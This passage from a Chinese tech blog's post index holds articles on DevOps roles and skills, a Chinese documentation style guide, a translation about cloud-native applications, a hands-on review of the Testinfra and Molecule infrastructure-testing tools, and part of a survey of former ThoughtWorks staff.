团队，不能产生理想的价值。相比之下我更愿意去到一个真正的产品团队做一名开发，交付真正的业务价值。这样不单会让开发更有成就感，而且作为一个有 DevOps 精神的开发，在真正熟悉业务需求之后做出的整体优化，才会更有价值，这种做法也更复合真正的 DevOps 精神。 DevOps 的未来自2017年以来，有一个趋势已经越来越明显，那就是 DevOps 已经越来越多的被一些平台厂商（这里的平台指的是应用代码所需的脚手架及基础设施）掌握了话语权，以 AWS 和 Pivotal 为例，这两家公司一家是做公有云，一家做 PaaS(Platform as a Service，平台即服务)，他们一边卖自己的产品，一边卖着咨询，一边运营着自己的社区，四处宣讲最佳实践，在行业内形成一个以生态圈为中心的闭环，不断向外扩张自己的影响力。同时因为自建平台常常是工具的拼凑很难形成一整套好的解决方案，且维护成本也高，越来越多的公司被吸引去尝试使用他们的产品，接受他们的理念。我也相信，这些平台厂商在良好的现金流和足够多的用户支撑下，能够把平台做得越来越好。到那时候，我们不用提及 DevOps，每个项目都是 DevOps 的。 本文已授权转载至 ThoughTworks 洞见: DevOps团队之殇","tags":[{"name":"小结","slug":"小结","permalink":"https://www.duyidong.com/tags/小结/"},{"name":"职场","slug":"职场","permalink":"https://www.duyidong.com/tags/职场/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"},{"name":"Platform","slug":"Platform","permalink":"https://www.duyidong.com/tags/Platform/"},{"name":"工作","slug":"工作","permalink":"https://www.duyidong.com/tags/工作/"}]},{"title":"DevOps 技能树","date":"2017-05-18T08:30:47.000Z","path":"2017/05/18/DevOps-skill-tree/","text":"DevOps 是什么，在这些年的争论中似乎总难用一句话概括清楚，但随着技术社区、企业的推动和一些理念越来越多的被人们实践，这个概念已经变得越来越清晰。最近成都 Cloud &amp; DevOps 社区整理了一个 DevOps 技能树，很有意思。对研究 DevOps 而言，提供了一个不错的视角；对 DevOps 领域从业人员而言，可以做个自我定位和学习方向的参考。 You build it, you run it. —— Amazon CTO：Werner Vogels 社区技能树成都 Cloud &amp; DevOps Community 能力树 这个能力树基本根据大家平时的项目经验构成，大项分为两类，Best Practices （最佳实践）基本包含了平时做 session 或者 proposal 需要领悟的一些概念和实践，学习方法主要是翻阅国内外大牛的博客。Infrastructure &amp; Tools（基础设施和工具）是概念落地时需要的技术，学习方法主要是多用多练习，以及查阅文档。 对着个基于工作内容构成的偏技术/实践落地的版本，我对照了一下企业招聘的要求，试图梳理出 DevOps 角色画像。 企业如何定义 DevOps 角色能力先来看看国内企业对 DevOps 的期望，以下是华为的招聘： 职位：DevOps运维专家 1.计算机相关专业本科毕业，5年以上的工作经验。（大型互联网企业背景优先）； 2.深入理解Linux操作系统、体系结构； 3.优秀的的开发能力，熟悉常用的自动化运维工具； 4.熟悉常用的持续集成工具； 5.熟悉常用的监控工具（例如Nagios、Zabbix等）； 6.熟悉常用数据库（例如MySQL, Oracle、MongoDB, Redis等）； 7.认同并坚持“Automate Everything You Can”的原则，认同DevOps文化，在开 源社群活跃并有积极贡献者优先。 关键字：Linux、CI/CD工具、监控、数据库、自动化。对于开发技能只是提了一句优秀的开发技能，但却没对开发技能做要求，可以预见招进去之后应该是不会让你做开发的，这个岗位基本上是一个工作内容包含 Pipeline 搭建的，懂自动化的运维角色。————这和我在国内项目的感受是一致的。 再来看几家美国的企业招聘： Ericsson： Title：Solution Architect - Development Operations (DevOps) Experience with Groovy Experience with Jenkins and the Jenkins DSL plugin. Experience with Docker, Kubernetes, Vagrant Experience with Mesos. Experience with Plutora. Experience with OpenShift / appOrbit. Public cloud experience (such as AWS or Azure). Experience with Splunk, Sensu or ELK. Strong Linux system architecture experience (Red Hat/Centos/Debian/Ubuntu) Excellent analytical and creative problem solving skills. Independent / go - getter attitude to keep yourself well-versed with new evolving technologies in the DevOps landscape and be able to apply this knowledge to improve the software we are developing now or in future. 关键词：CI/CD、容器编排、云、PaaS、日志/监控、方案解决。这个职位更像一个方案解决架构师 + DevOps 的角色，这个招聘传达的需求十分明确，要有架构的知识，持续改进持续交付意识，以及解决问题的能力，而弱化了对传统运维（日志/监控）的技能的要求。 ThoughtWorks： Title: Infrastructure Developer (DevOps Champion) Experience with infrastructure as code / provisioning tools like Chef, Puppet or Ansible Experience with one or more of the structured major PaaS platforms such as CloudFoundry or OpenShift and understand their benefits and lacks in deploying and end-to-end continuous delivery pipeline Familiarity with Cloud Native Architecture principles and specific tooling and approaches to support high-availability architectures Understanding of the pros and cons of the key Continuous Integration tools like Go, TeamCity, Jenkins and Concourse Knowledge in the administration of application and web servers and servlet containers such as WebSphere, Apache Tomcat, Jetty, Nginx, Mongrel, Passenger, Microsoft ISS, etc. Extensive experience in scripting languages (golang, Shell, Ruby, Perl, Python, PowerShell, etc) and the SCM Tools like Git(Hub), SVN, Perforce and Mercurial Linux operating system management, operation and maintenance, and network-related knowledge Comfort with ambiguity and high level of flexibility High willingness to travel 关键词：基础设施代码、PaaS、Cloud native、CI/CD、Platform、脚本语言（自动化）、Linux、愿意出差。相比于前两个招聘，因为是咨询公司，看得出对技能的广度要求更多，同时技能偏向于基础设施代码编写，流水线搭建，过程优化，而更加弱化了运维（监控/日志都没有出现）。 以上为挑选出来的比较典型的招聘启事，综合来看，对于 DevOps 这个角色达成一致的能力需求，包含了Linux、网络、CI/CD、自动化。除了一致的部分，国内和美国的招聘又有些不同，国内偏向运维，更加强调自动化；美国的企业对 DevOps 更要求架构能力（推测是因为贯彻了基础设施代码的概念），和过程优化的能力；过程优化的主要目的应该就是加速持续交付以支持业务连续性。 综上所述DevOps 的目的是消除 Dev 与 Ops 之间的部门墙，从而加速软件迭代的反馈周期，进而实现业务连续性；基于这一目的，诞生了许多最佳实践；配合这些最佳实践，又产生了许多工具用于项目管理，自动化，可视化等等。在云服务蓬勃发展的大背景下，又给 DevOps 赋予了基础设施代码化的使命。随着软件开发流程越来越成熟，迭代周期越来越快，对业务代码以外的东西（可以把它叫做软件开发的脚手架）的稳定性和易用性要求越来越高，所以诞生了一批以 Heroku、Cloud foundry、Openshift 为代表 PaaS 平台，慢慢在将 DevOps 的工作产品化，从而达到“零运维”或者“AI运维”的效果。在漫长的演进史中，DevOps 用灵活的架构和更快的变化帮助企业 IT 响应着市场变化。所以 DevOps 是什么？我认为 DevOps 并不是独自一人改变了软件设计开发流程，DevOps 更像是技术变革史上传统运维消失前的一朵浪花。 招聘材料来源：猎聘，领英 相关链接：一句话介绍DevOps是做什么的","tags":[{"name":"职场","slug":"职场","permalink":"https://www.duyidong.com/tags/职场/"},{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"}]},{"title":"中文文档写作规范","date":"2017-05-13T02:16:18.000Z","path":"2017/05/13/chinese-document-style/","text":"作为一名程序员，良好的文风和良好的编程习惯同样重要。作为一名中国区开发者，不得不面对国内技术相比英文国家滞后的事实，许多中文文档都翻译自英文。平时参加一些技术类分享的活动时，PPT、文档、README都要用中英文写，常常会很困惑一些格式如何排版比较合理，一些措辞是否适合相应场合，最近读到阮一峰老师的中文技术文档的写作规范，当即认定是一份答疑解惑的好材料，笔者认为，不止适用于技术文档，博客、胶片，都可参考。 标题标题分为四级 一级标题：文章的标题 二级标题：文章主要部分的大标题 三级标题：二级标题下面一级的小标题 四级标题：三级标题下面某一方面的小标题 这里主要区分一级标题通常作为文章的标题，而文章大纲类标题宜使用二级标题。另外，尽量避免单个标题的情况，谨慎使用四级标题 文本字间距 全角中文字符与半角英文字符之间，应有一个半角空格。 示例：本文介绍如何快速启动 Windows 系统。 全角中文字符与半角阿拉伯数字之间，不需要有半角空格，必须保证风格统一。 示例：2011年5月15日，我订购了5台笔记本电脑与10台平板电脑。 英文单位若不翻译，单位前的阿拉伯数字与单位间不留空格。 示例：一部容量为 16GB 的智能手机 半角英文字符和半角阿拉伯数字，与全角标点符号之间不留空格。 示例：他的电脑是 MacBook Air。 中英文数字夹杂的情况，原则上应该让字间距显得紧凑，同时英文单词字间距规则优先。这样的排版既不张扬又不局促。 写作风格 尽量不使用被动语态，改为使用主动语态。 错误：假如此软件尚未被安装， 正确：假如尚未安装这个软件， 不使用非正式的语言风格。 用对“的”、“地”、“得”。 使用代词时（比如“其”、“该”、“此”、“这”等词），必须明确指代的内容，保证只有一个含义。 名词前不要使用过多的形容词。 同样一个意思，尽量使用肯定句表达，不使用否定句表达。 错误：请确认没有接通装置的电源。 正确：请确认装置的电源已关闭。 避免使用双重否定句。 错误：没有删除权限的用户，不能删除此文件。 正确：用户必须拥有删除权限，才能删除此文件 写作风格中除了一些中学老师教过的语法错误不要犯，另外就是注意表达的简洁，准确；少用形容词，避免使用否定句，不用被动语态，都是为了达到逻辑简单，阅读流畅的目的，这一点在音译汉的时候尤其值得注意。 英文处理 第一次出现英文词汇时，在括号中给出中文标注。此后再次出现时，直接使用英文缩写即可。 IOC（International Olympic Committee，国际奥林匹克委员会）。这样定义后，便可以直接使用“IOC”了。 专有名词中每个词第一个字母均应大写，非专有名词则不需要大写 “American Association of Physicists in Medicine”（美国医学物理学家协会）是专有名词，需要大写。 “online transaction processing”（在线事务处理）不是专有名词，不应大写。 英文处理除了排版问题就是大小写（容易被忽略），另外批注虽然麻烦，但是对初次接触此类技术的人来说是非常有实用价值的。 段落 一个段落只能有一个主题，或一个中心句子。 段落的中心句子放在段首，对全段内容进行概述。后面陈述的句子为核心句服务。 段落的句子语气要使用陈述和肯定语气，避免使用感叹语气。 段落之间使用一个空行隔开。 段落开头不要留出空白字符。 使用外部图片时，必须在图片下方或文末标明来源。 示例：本文部分图片来自 Wikipedia 图片来源一事，常常被忽略，值得注意。每段文字采用总分结构，是为了便于读者迅速理解作者表达的意思，说话的时候也可以借鉴，对于意图明确的对话场景，先表态，再阐述，会让听的人更容易听懂。 数值货币 货币应为阿拉伯数字，并在数字前写出货币符号，或在数字后写出货币中文名称。 $1,000 1,000 美元 变化程度的表示法数字的增加要使用“增加了”、“增加到”。“了”表示增量，“到”表示定量。 增加到过去的两倍 （过去为一，现在为二） 增加了两倍 （过去为一，现在为三） 数字的减少要使用“降低了”、“降低到”。“了”表示增量，“到”表示定量。 降低到百分之八十 （定额是一百，现在是八十） 降低了百分之八十 （原来是一百，现在是二十） 不能用“降低N倍”或“减少N倍”的表示法，要用“降低百分之几”或“减少百分之几”。因为减少（或降低）一倍表示数值原来为一百，现在等于零。 标点符号 中文语句中的结尾处应该用全角句号（。）。 句子内部的并列词，应该用全角顿号(、) 分隔，而不用逗号。英文句子中，并列词语之间使用半角逗号（,）分隔。 补充说明时，使用全角圆括号（），括号前后不加空格。 省略号……表示语句未完、或者语气的不连续。它占两个汉字空间、包含六个省略点，不要使用。。。或...等非标准形式。省略号不应与“等”这个词一起使用. 数值范围（例如日期、时间或数字）应该使用波浪连接号（～），占一个全角字符的位置。 示例：2009年～2011年 注意，波浪连接号前后两个值都应该加上单位。 文档体系结构以下内容适用于代码文档。 结构软件手册是一部完整的书，建议采用下面的结构。 简介（Introduction）： [必备] [文件] 提供对产品和文档本身的总体的、扼要的说明 快速上手（Getting Started）：[可选] [文件] 如何最快速地使用产品 入门篇（Basics）： [必备] [目录] 又称”使用篇“，提供初级的使用教程 环境准备（Prerequisite）：[必备] [文件] 软件使用需要满足的前置条件 安装（Installation）：[可选] [文件] 软件的安装方法 设置（Configuration）：[必备] [文件] 软件的设置 进阶篇（Advanced)：[可选] [目录] 又称”开发篇“，提供中高级的开发教程 API（Reference）：[可选] [目录|文件] 软件 API 的逐一介绍 FAQ：[可选] [文件] 常见问题解答 附录（Appendix）：[可选] [目录] 不属于教程本身、但对阅读教程有帮助的内容 Glossary：[可选] [文件] 名词解释 Recipes：[可选] [文件] 最佳实践 Troubleshooting：[可选] [文件] 故障处理 ChangeLog：[可选] [文件] 版本说明 Feedback：[可选] [文件] 反馈方式 文件名文件名必须使用半角字符，不得使用全角字符。这也意味着，中文不能用于文件名。 错误： 名词解释.md 正确： glossary.md 文件名建议只使用小写字母，不使用大写字母。 错误：TroubleShooting.md 正确：troubleshooting.md 为了醒目，某些说明文件的文件名，可以使用大写字母，比如README、LICENSE。 文件名包含多个单词时，单词之间建议使用半角的连词线（-）分隔。 不佳：advanced_usage.md 正确：advanced-usage.md 参考资料：https://github.com/ruanyf/document-style-guide","tags":[{"name":"文档规范","slug":"文档规范","permalink":"https://www.duyidong.com/tags/文档规范/"}]},{"title":"云原生应用 (Cloud Native Application)","date":"2017-05-03T03:04:03.000Z","path":"2017/05/03/Cloud-Native/","text":"本文翻译自Pivotal的Cloud Native。 更快部署，更低风险，和业务一同扩展云原生应用程序是专为云上的应用而设计的。这些应用程序通过小型专用功能团队实现快速构建和频繁部署，提供了轻松扩展和硬件解耦的平台，让组织更敏捷，更具有可扩展性和云端可移植性。 什么是云原生应用？云原生是一种充分利用云计算优势，用于构建和部署应用的方式。在过去的十几年，云已经重新定义了几乎所有行业的竞争格局，消除了企业对IT基础设施资本投入的关注，企业也不用增加雇员去维护一个自建的数据中心。取而代之的是无限的计算、存储能力，并按时按需付费。降低IT支出的同时也降低了行业壁垒，使得初创公司可以很快地实践自己的想法并应用到市场。这正是为什么软件正在吞噬世界，而创业公司正在使用云原生的方式颠覆传统行业。 现在的组织需要一个集成了DevOps，持续交付，微服务和容器化得平台用于构建和运维云原生应用和服务。 DevOps 是开发和运维的合作，目标是自动化软件交付和基础设施更改过程。它创造了一个文化和环境，让构建，测试和发布软件可以快速，频繁，更可靠地发生。 持续交付让单个应用随时处于可发布状态，而不用等待与其他变更绑定到一次发布中。持续交付使得发布变成一个频繁且平常的过程，因此组织可以以更低的风险经常交付，并从最终用户获得更快的反馈，直到部署成为业务流程和企业竞争力的重要组成部分。 微服务是将大型应用程序转变为小型服务的集合的架构方法；每个服务实现单独的业务功能，运行在自己独立的进程中并通过HTTP API进行通信。每个微服务器都可以独立于应用程序中的其他服务进行部署，升级，扩展和重新启动，通常作为自动化系统的一部分，可以在不影响终端客户使用的情况下频繁独立更新。 容器比虚拟机（VM）提供了更高的效率和更快的速度。使用操作系统（OS）级别的虚拟化，单个操作系统实例被动态划分为多个相互独立的容器，每个容器具有唯一可写的文件系统和资源配额。创建和销毁容器的低开销，以及单个instance可高密度运行多个容器的特性使得容器成为部署微服务各个模块的完美工具。 我们所学到的一件事是，如果你不能更快地把你的想法推向市场，市场必然会发生变化。到这个时候，不论你如何优化，如何管理训练你的员工，都不会有很好的成效，因为已经晚了。 – James McGlenon（美国利宝相互保险集团 执行副总裁兼首席信息官） 为什么云原生应用很重要 云是具有竞争力的优势 云原生意味着基础设施的目标将由节约成本变为驱动业务发展，在软件生命周期中，快速构建业务和快速交付以响应客户需求将会让企业具有主宰市场的优势。产品一旦上线就不会停止运行，且可以动态伸缩扩容。 灵活性 企业一旦构建了应用就可以在任何云上运行而不需要修改。团队可以随时将应用在不同的公有云供应商的平台和私有云平台之间迁移或分发，以此来满足业务需求和节约开销。 让开发人员做他们擅长的 团队拥抱云原生应用可以屏蔽不同云基础设施的差异，让开发者只用关心代码，集中精力关注在交付的业务价值。由heroku提出的12因素应用为开发人员定义了一套云上应用的开发标准，形同一份与开发人员签订的“合同”，用于确保自己的应用程序充分利用底层的云平台的优势。 运维与业务对齐 基于自动化的IT运维，企业可以转变为一个精益团队，将团队的关注点与推动业务发展对齐。它可以避免人工失误操作带来的风险，以流程改进代替原本的日常运维工作。通过实施在各个层面的自动补丁和自动升级，消除了宕机时间，也消除了需要“运维专家”手动修复才能解决问题的痛点。 云原生架构：如何达到云原生 云原生与传统企业应用对比 云原生应用 传统企业应用 可预测：云原生应用符合一个通过可预测行为来最大限度发挥弹性优势的“合同”。高自动化，容器驱动的架构使用云平台驱动改变了软件交付形式。这种“合同”的一个很好的例子就是heroku的十二因素应用。 不确定性：传统应用在开发方式和架构上往往不能真正发挥云服务的优势。这样的应用通常需要很长的时间来构建，一次发布很多内容，只能逐步伸缩，并常伴有许多单点故障。 操作系统抽象：云原生应用要求开发者使用一个平台作为基础设施，意味着应用的基础设施是经过抽象的，更易于迁移和伸缩。构建抽象平台的方法可以自己搭建也可以购买第三方服务，比如Openshift，Cloud foundry。 操作系统依赖：传统的应用程序架构使得开发人员习惯于在应用程序和底层操作系统，硬件，存储和后台服务之间建立紧密的依赖关系。相比于云原生应用，这种依赖会让应用的迁移和伸缩变得异常复杂和充满风险。 大小适合的容量：云本地应用平台可自动进行基础设施配置，并根据应用的需求在部署时重新动态分配资源。管理好一个云原生应用运行时的全生命周期，可以做到按需伸缩，提高资源利用率，编排计算资源，以及最短宕机时间的故障恢复。 过大容量：传统的IT设施为应用设计了专属的技术设施架构，为一个应用准备充足的基础设施资源，从而延迟应用的部署。这种设计方案通常会按照最坏情况下估算容量，解决方案的规模往往大大超过实际需要的规模。 共同协作：云原生促进DevOps，人员，流程和工具的组合，从而在开发和运营之间进行密切协作，以加速和平滑将完成的应用程序代码发布到生产环境中。 部门孤立：传统IT在开发和运维之间有高高的部门墙，开发要跨过一堵墙来向运维交付软件，组织事务优先于客户价值，导致内部冲突，妥协和缓慢的交付让员工士气低落。 持续交付：IT团队的产品永远处于可发布状态。发布软件的周期保证了更短的反馈周期，并能更有效地响应客户需求。持续交付最好和其他一些实践一起使用，例如测试驱动开发和持续集成。 瀑布模式：IT团队定期发布，通常周期为数周至数月，尽管代码已经完成构建，甚至于其他部件并无依赖，仍然不能发布。客户期望的功能总是被搁浅、延期，企业从而丧失了竞争优势、客户、和机会。 独立：微服务架构将一个复杂的应用解耦为一个个小而独立的模块，这些小的服务由一个个小型团队开发和运维，确保各自独立、频繁的更新，伸缩和故障切换/重新启动，而不影响其他服务。 依赖：单体架构将原本不需要绑定的模块绑定在一个软件包中发布，导致开发和部署过程中的敏捷性丧失。 自动扩容：基础设施自动扩容可以消除宕机时间和避免人为操作失误。计算机自动化不会遇到任何类似的挑战，在任何规模的部署中都使用同一套部署脚本。云原生也超越了基于传统的面向虚拟化的业务流程的自动化实践。一个完全的云原生架构包括适用于团队的自动化和业务流程，而不是要求他们习惯于写自动化脚本。换句话说，团队的目标是使得构建和启动应用变得易于管理，而自动化只是其中的一个手段。 手动扩容：人工基础设施包含了人工运维和人工管理的服务器，网络，以及存储配置。扩容工作因为其复杂性，运营人员很难在扩容过程中诊断问题，而且实施过程中很容易出现错误，手工编写的配置文件有可能将人为错误的硬编码到基础设施中，成为一个很难发现且长期存在的隐患。 快速恢复：容器化运行时提供了一个虚拟机之上的动态，高密度的虚拟层，是理想的微服务托管方式。动态管理容器在宿主机上的编排，方便及时回滚，扩容，和重现错误。 缓慢恢复：基于虚拟机的基础架构对于基于微服务的应用程序来说是一个缓慢而低效的基础设施，因为单个虚拟机启动/关闭的速度很慢，甚至在部署应用程序代码之前也就带来很大的开销。 参考资料: https://pivotal.io/cloud-native https://12factor.net/ https://www.duyidong.com/pdf/beyond-the-12-factor-app.pdf","tags":[{"name":"Cloud Native","slug":"Cloud-Native","permalink":"https://www.duyidong.com/tags/Cloud-Native/"},{"name":"Cloud","slug":"Cloud","permalink":"https://www.duyidong.com/tags/Cloud/"},{"name":"翻译","slug":"翻译","permalink":"https://www.duyidong.com/tags/翻译/"}]},{"title":"基础设施代码测试","date":"2017-04-13T05:41:29.000Z","path":"2017/04/13/Infrastructure-as-Code-Testing/","text":"在DevOps的文化中有一个已经被广泛认可的概念叫做基础设施及代码，意在将基础设施以配置文件的方式纳入版本管理以达到更灵活且便于管理的目的，从而更加适应基础设施频繁变更需求。 虽说此举俨然已将CI/CD（持续集成和持续交付）概念应用在了基础设施代码上，然而在应用产品的持续部署与发布实施过程中，基础设施变更仍然是一件令人胆战心惊的事，原因很简单——没有反馈及时且覆盖充分的测试。 随着基础设施即代码的不断推广，这一痛点变得越来越明显，最近一期ThoughtWorks技术雷达中列出了两个工具Molecule和Testinfra一个是用于测试Ansible Role(如果还不知道Ansible是什么请移步我的另一篇博客：Ansible学习小计)，一个用于测试基础设施，下面我就来试用一下这两个工具。 Testinfra介绍Testinfra是由Python社区贡献的基础设施实际状态自动化测试工具，其目标是成为Serverspec在Python中的等价物，并且作为Pytest测试引擎的插件来使用。 官方文档：http://testinfra.readthedocs.io/en/latest/index.html Quick Start环境准备： $ pip install testinfra # 安装Testinfra $ pip install paramiko # Python的SSH支持以执行远程测试 $ pip install pytest-xdist # 添加多线程支持 来感受下Testinfra的写法: def test_passwd_file(File): # 定义文件检查 passwd = File(&quot;/etc/passwd&quot;) # 定义文件 assert passwd.contains(&quot;root&quot;) # 文件是否包含关键字”root“ assert passwd.user == &quot;root&quot; # 文件owner是否为root assert passwd.group == &quot;root&quot; # 文件所属组是否为root assert passwd.mode == 0644 # 检查文件权限 def test_nginx_is_installed(Package): nginx = Package(&quot;nginx&quot;) assert nginx.is_installed # nginx是否安装 assert nginx.version.startswith(&quot;1.10&quot;) # 检查nginx版本 def test_nginx_running_and_enabled(Service): nginx = Service(&quot;nginx&quot;) assert nginx.is_running # 检查nginx是否已启动 assert nginx.is_enabled # nginx是否配置开机自启 基本和Python的单元测试一模一样，下面来看运行结果： $ testinfra -v test_myinfra.py 报错也是PyTest的尿性： 远程测试虚拟机通过配置ssh并在启动时加入如下参数： # -n 为指定并发数 --connection为指定链接方式 $ testinfra -n 1 -v --host=&quot;hostname&quot; --connection=ssh test_myinfra.py 感觉执行方式和Ansible有些相似，以下为执行结果： 耗时6s，中规中矩吧。 其他功能除了SSH协议链接Testinfra还支持paramiko，docker，salt，kubectl等连接方式，对于Docker的测试，无外乎也是在起起来的容器上使用docker exec的方法对基础设施即环境配置进行验证。 另外Testinfra支持自定义module的形式保证测试方法的灵活性，同时Testinfra可以再PyTest之外用于调用SSH连接从而进行测试，形如： &gt;&gt;&gt; import testinfra &gt;&gt;&gt; conn = testinfra.get_backend(&quot;paramiko://root@server:2222&quot;, sudo=True) &gt;&gt;&gt; conn.File(&quot;/etc/shadow&quot;).mode == 0640 True Testinfra评价在基础设施代码的测试金字塔中，Testinfra提供了以单台服务器为单位的基础设施测试，从而确保了代码有一个正确的运行环境；然而这种层面的测试即使不使用测试工具也很容易进行，与云环境紧密相关的基础设施对测试的需求应该是对架构的整体描述而不是局限于一个计算单元，这一点上，Testinfra还没有显现出它对测试金字塔高层级测试的功力。 优点 基本涵盖了应用所需环境测试的内容，且可灵活扩展。 可读性好，学习成本低. 环境依赖简单，能够与项目完美结合。 缺点 测试未能覆盖到IaaS层的测试，仅能够在操作系统之上进行测试。对于云环境的基础设施还包括网络，负载均衡，数据库等等资源，这些都不能照顾到。 测试覆盖率虽然有所提升，但反馈不够及时。在开发和Debug过程中最痛苦的应该是每次使用新代码创建基础设施都要等很久才能得到反馈，这个问题并没有得到解决。 报错信息不够友好，个人认为基础设施的测试应该不能等同于代码层面的测试，所以PyTest的报错方式并不能让用户一眼就看到是哪方面出了错误；往远了说，要根据这个报错信息Trigger一个行为也很难做到。 Molecule介绍MOLECULE旨在帮助开发和测试Ansible的Role。通过在虚拟机或容器上为正在运行的Ansible Role的测试构建脚手架，我们无需再手工创建这些测试环境。Molecule利用Vagrant，Docker和OpenStack来管理虚拟机或容器，并支持Serverspec、Testinfra或Goss来运行测试。在sequence facility model中的默认步骤包括：虚拟机管理，Ansible语法静态检查，幂等性测试和收敛性测试。 话不多说，我们来看看这个工具究竟能解决什么样的问题吧。 版本支持目前Molecule支持的Ansible版本为2.1.4.0和2.2.1.0，好吧，这一点，虽然项目上还在用1.7.2（一直担心Breake change所以没有升上去），但我觉得大部分公司应该使用的是2.2以上的版本，这一点我没有异议。 Quick Start环境准备 $ yum install ansible -y # 为了避免踩坑不使用pip的ansible $ pip install docker # 安装python的docker支持 $ pip install molecule # 主角登场 运行 $ molecule init --role foo --driver docker $ cd foo $ molecule test 运行结果： 第一次运行速度比较慢，因为运行Ansible需要到Docker镜像仓库拉取一个Ubuntu的镜像，可以从Log里看出，整个测试过程包含如下步骤： 从基础镜像（Ubuntu）创建一个测试需要的镜像（docker image） 从镜像启动一个测试运行需要的容器（docker container） 开始测试，运行playbook 使用Testinfra判断准备环境是否正确 测试完毕，停止并删除容器 整个过程容器的创建和销毁并没有占用很多时间，和跑一个Ansible时间相差不多。 配置文件Molecule的配置文件采用的yml，可以在项目下也可以放到~/.config/molecule/config.yml作为默认配置，示例如下： --- dependency: name: galaxy # Molecule使用Ansible Galaxy拉取Role driver: name: docker # 使用Docker引擎跑测试 docker: containers: # 容器配置 - name: foo image: ubuntu image_version: latest ansible_groups: # 目标机器组 - group1 verifier: name: testinfra # 验证最终执行结果 其中Driver除了Docker还支持OpenStack及Vagrant，Verifier除了Testinfra还可选Serverspec及Goss。 测试方法关于测试内容的定义，看一下test/test_default.py文件： import testinfra.utils.ansible_runner testinfra_hosts = testinfra.utils.ansible_runner.AnsibleRunner( &#39;.molecule/ansible_inventory&#39;).get_hosts(&#39;all&#39;) def test_hosts_file(File): f = File(&#39;/etc/hosts&#39;) assert f.exists assert f.user == &#39;root&#39; assert f.group == &#39;root&#39; 简单看来就是利用Testinfra看了下/etc/hosts是否存在，所属用户和所属组是否为root Molecule评价与其说Molecule是一个新的Ansible测试工具不如说是一种组合docker，Testinfra和Ansible的测试方法，换总说法它并不是一个集成在Ansible之中的更细粒度的测试方法，而是高于Ansible的更适合于放在Pipeline中作为测试Ansible运行最终结果的一个工具集，其效果大致和运行docker run XXX ansible之后再运行Testinfra -v两行shell命令是一样的 优点 开始关注自动化配置脚本的测试，不失为一种尝试 使用Docker作为引擎，速度还可以 能够提升更改Ansible脚本后的构建信心 缺点 仍然要运行完Playbook才能看到结果，并没有解决反馈不及时的痛点 不支持细粒度的测试，且对一个playbook使用不同参数构建不同环境的应用场景也没有很好的支持 不管是使用Docker还是Vagrant，都增加了空间的消耗，且增加了知识成本 综上所述随着DevOps的普及，已经有人开始关注基础设施代码测试这一块的工作，但这些测试工具还在初级阶段，反馈不能及时，增加覆盖面的成本也还较高，且不能很好地与云环境结合。由于在软件开发中基础设施对业务价值的贡献并不明显，提升Ops技能与其说能过帮助公司挣钱不如说是帮公司省钱；而且在大部分项目中基础设施变更并没有那么频繁，紧急的问题通常还是由Ops（或者是被称为DevOps的一个角色）手动来解决，这种现象在国内公司尤其明显。大家对DevOps的认识还没有达到不一致，DevOps中的测试也还没有被定义清楚，基础设施代码的测试，还有很长的路要走。","tags":[{"name":"Cloud","slug":"Cloud","permalink":"https://www.duyidong.com/tags/Cloud/"},{"name":"Infrastructure as Code","slug":"Infrastructure-as-Code","permalink":"https://www.duyidong.com/tags/Infrastructure-as-Code/"},{"name":"ThoughtWorks技术雷达","slug":"ThoughtWorks技术雷达","permalink":"https://www.duyidong.com/tags/ThoughtWorks技术雷达/"},{"name":"基础设施即代码","slug":"基础设施即代码","permalink":"https://www.duyidong.com/tags/基础设施即代码/"},{"name":"持续交付","slug":"持续交付","permalink":"https://www.duyidong.com/tags/持续交付/"}]},{"title":"离骚","date":"2017-04-11T16:01:40.000Z","path":"2017/04/12/leave-TW/","text":"最近在公司的离职群里出现了一个调查问卷，我觉得很有意思，引发了我对ThoughtWorks的一些思考，顺手贴在这里。 另，骚窝为ThoughtWorks音译，所以从骚窝离职的人被称为离骚。 【骚人一】在骚窝4年多，2015年4月离开 离开骚窝后，有什么让你兴奋？ 至少在一开始，创业让我兴奋；做一个自己的产品让我兴奋； 现在的工作和生活方式，与在骚窝最大的不同是什么？ 用自己喜欢的技术让我兴奋。 你认为骚窝对你最大的改变是什么？ 认识了一大帮牛人，体验到最好的开发方式，开拓了视野。 你最怀念骚窝哪一点儿？ 骚！引领技术风骚！ 你想对骚窝或者骚窝的某个人说几句话吗？ 好多熟人都走了，现在回公司，有点陌生了。所以不知道说啥。 【骚人二】在骚窝3年多，2009年底离开 离开骚窝后，有什么让你兴奋？ 孩子的成长。 现在的工作和生活方式，与在骚窝最大的不同是什么？ 出差。 你认为骚窝对你最大的改变是什么？ 敏捷方法及时间管理观念（time box，迭代等） 你最怀念骚窝哪一点儿？ 温馨的工作分氛围 你想对骚窝或者骚窝的某个人说几句话吗？ 所有在TW一起工作过的同事：谢谢你们，依然怀念和你们在一起的时光。 【骚人三】在骚窝3个月，2015年底离开 离开骚窝后，有什么让你兴奋？ 重新聚焦自身优势 现在的工作和生活方式，与在骚窝最大的不同是什么？ 没那么活跃了，也规律了 你认为骚窝对你最大的改变是什么？ 不大。 你最怀念骚窝哪一点儿？ 骨子里的自由和文艺。 【骚人四】在骚窝5年，2016年7月离开 离开骚窝后，有什么让你兴奋？ 全心做自己公司的产品，而不是作为vendor。 现在的工作和生活方式，与在骚窝最大的不同是什么？ 公司几乎不用微信群沟通（工作上的和工作外的）。 你认为骚窝对你最大的改变是什么？ 不断提升自己，接受反馈，提供反馈。 你最怀念骚窝哪一点儿？ 一帮人在想办法提升工作效率。 你想对骚窝或者骚窝的某个人说几句话吗？ ThoughtWorks 一直是高标准。怀恋这个程序员的天堂。 【骚人五】在骚窝1年，2016年10月离开 离开骚窝后，有什么让你兴奋？ 待遇更高了，可以去产品公司了。 现在的工作和生活方式，与在骚窝最大的不同是什么？ 在腾讯天天出差。 你认为骚窝对你最大的改变是什么？ 对敏捷了解更深，更敢说，企业文化无比认同。 你最怀念骚窝哪一点儿？ 扁平化，没心机，简单，单纯，企业文化。 【骚人七】在骚窝5年，2013年离开 离开骚窝后，有什么让你兴奋？ 有自己的团队了。 现在的工作和生活方式，与在骚窝最大的不同是什么？ 执行多了，讨论少了。 你认为骚窝对你最大的改变是什么？ 批判性思维，闭环的方法论。 你最怀念骚窝哪一点儿？ 人聪明，沟通不费劲。 你想对骚窝或者骚窝的某个人说几句话吗？ 一时竟然想不起该说啥... 【骚人八】在骚窝4年，2014年离开 离开骚窝后，有什么让你兴奋？ 移民了。 现在的工作和生活方式，与在骚窝最大的不同是什么？ 